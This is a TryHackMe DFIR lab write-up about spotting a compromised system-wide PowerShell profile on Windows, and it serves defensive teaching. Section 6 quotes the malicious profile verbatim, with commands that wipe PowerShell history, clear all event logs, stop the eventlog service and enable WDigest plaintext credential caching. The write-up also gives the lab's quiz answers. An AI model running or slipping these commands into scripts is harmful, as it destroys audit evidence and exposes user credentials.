# Windows Incident Surface — Task 2
### Reliability of System Tools

> **Platform:** TryHackMe | **Room:** Windows Incident Surface  
> **Focus:** Windows DFIR / Execution Flow Hijacking / PowerShell Investigation  
> **MITRE:** T1574.007, T1546.013, T1070.003, T1070.001, T1562.002, T1552.002

---

## Objective

Determine whether investigation tools themselves have been compromised before using them.  
An attacker may manipulate **environment variables, PATH, or PowerShell startup profiles** to hijack execution — so if your tools are poisoned, your results are too.

---

## 1. Start With Trusted CMD

The VM provided trusted investigation tools at:

```text
C:\Users\Administrator\Desktop\tools\shells\CMD-DFIR.exe
```

PowerShell is risky to launch first because a malicious **PS profile** runs automatically on startup. Start with a trusted CMD to avoid triggering it.

---

## 2. Enumerate Environment Variables

```cmd
set > env_vars.txt
type env_vars.txt
```

Key variables to scrutinize:

| Variable       | Why It Matters                                              | ATT&CK    |
|----------------|-------------------------------------------------------------|-----------|
| `ComSpec`      | Points to `cmd.exe` — can be redirected to attacker binary  | T1574.007 |
| `Path`         | Search order for executables — PATH hijacking               | T1574.007 |
| `PSModulePath` | Where PowerShell loads modules from                         | —         |
| `TEMP` / `TMP` | Common attacker staging directories                         | —         |
| `USERPROFILE`  | Base for PS profile paths (`$HOME`)                         | —         |

---

## 3. Locate PowerShell

```cmd
where powershell.exe
```

```text
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

`$PSHOME` = `C:\Windows\System32\WindowsPowerShell\v1.0\`

---

## 4. PowerShell Profile Locations

| Scope                       | Path                                              |
|-----------------------------|---------------------------------------------------|
| Current User / Current Host | `$HOME\Documents\WindowsPowerShell\profile.ps1`   |
| All Users / Current Host    | `$PSHOME\Microsoft.PowerShell_profile.ps1`        |
| Current User / All Hosts    | `$HOME\Documents\profile.ps1`                     |
| **All Users / All Hosts**   | **`$PSHOME\profile.ps1`** ← most impactful        |

Check if a profile exists:

```cmd
if exist "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1" (echo EXISTS) else (echo NOT FOUND)
```

**Result:** `profile.ps1` existed → system-wide profile, affects all users.

---

## 5. Suspicious Startup Message

Launching PowerShell printed:

```text
Less Murphy Ventures Co. Ps-History-Shredder Profile
```

This was the first indicator — traced back to the profile file.

---

## 6. Malicious Profile Contents

```cmd
type "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1"
```

```powershell
Set-PSReadlineOption -HistorySaveStyle SaveNothing
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Write-Host "Less Murphy Ventures Co. Ps-History-Shredder Profile" -ForegroundColor Green
Write-Host "Loading Secure Console" -ForegroundColor Green
wevtutil el | ForEach-Object {wevtutil cl $_}; Stop-Service -Name "eventlog" -Force
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 1 -PropertyType DWORD -Force
Set-Location "$Env:UserProfile\Desktop"
```

---

## 7. Findings

| # | Command / Behavior                          | What It Does                                 | ATT&CK    |
|---|---------------------------------------------|----------------------------------------------|-----------|
| 1 | `Set-PSReadlineOption -HistorySaveStyle SaveNothing` + `Remove-Item` history file | Destroys PS command history | T1070.003 |
| 2 | `wevtutil el \| ForEach-Object {wevtutil cl $_}` | Clears all Windows Event Logs | T1070.001 |
| 3 | `Stop-Service -Name "eventlog" -Force`       | Stops the Event Log service                  | T1562.002 |
| 4 | `New-ItemProperty … WDigest … UseLogonCredential = 1` | Enables plaintext credential caching | T1552.002 |
| 5 | Profile auto-runs on PS start                | Persistence / auto-execution                 | T1546.013 |

---

## 8. Questions & Answers

**Q1: What tool did the adversary use to delete the logs?**

```text
wevtutil
```

**Q2: What was the registry path used to store/steal login credentials?**

```text
HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
```

---

## 9. Remediation — Replace Malicious Profile

```cmd
:: Backup the malicious profile (preserve evidence)
ren C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1 profile.bak

:: Rename the trusted DFIR profile
ren PS-DFIR-Profile.ps1 profile.ps1

:: Deploy the trusted profile
copy profile.ps1 C:\Windows\System32\WindowsPowerShell\v1.0\
```

> **Always rename, don't delete** — preserve the artefact for analysis before remediation.

Launching PowerShell afterward displayed `DFIR Profile` — trusted environment restored.

---

## 10. Module Enumeration

```powershell
# Currently loaded modules
Get-Module | ft ModuleType, Version, Name

# All available modules
Get-Module -ListAvailable | select ModuleType, Version, Name
```

Compare against a known-good baseline. Any unfamiliar module → investigate: file path, creation time, signature, hash, contents.

---

## Key DFIR Lessons

1. **Don't trust your tools blindly** — verify before using them on a compromised host.
2. **Check startup mechanisms** before launching any tool (profiles, env vars, PATH).
3. **Suspicious behaviors compound** — history deletion alone is minor; combined with log clearing, service disruption, and WDigest modification it's a clear attack pattern.
4. **Preserve evidence** — rename suspicious files, don't delete them.
5. **Baselines matter** — anomalies only stand out when you know what normal looks like.

---

## Investigation Checklist

```text
[ ] Start with trusted CMD/shell
[ ] Enumerate env vars (PATH, ComSpec, PSModulePath, TEMP, USERPROFILE)
[ ] Locate PowerShell executable
[ ] Check all PS profile locations
[ ] Read any existing profiles
[ ] Look for: history deletion, log clearing, service disruption, registry changes
[ ] Map findings to MITRE ATT&CK
[ ] Preserve suspicious files (.bak)
[ ] Replace compromised profiles with trusted versions
[ ] Enumerate loaded + available PS modules vs. baseline
```

---

**Reference:** [TryHackMe — Windows Incident Surface](https://tryhackme.com/room/winincidentsurface)
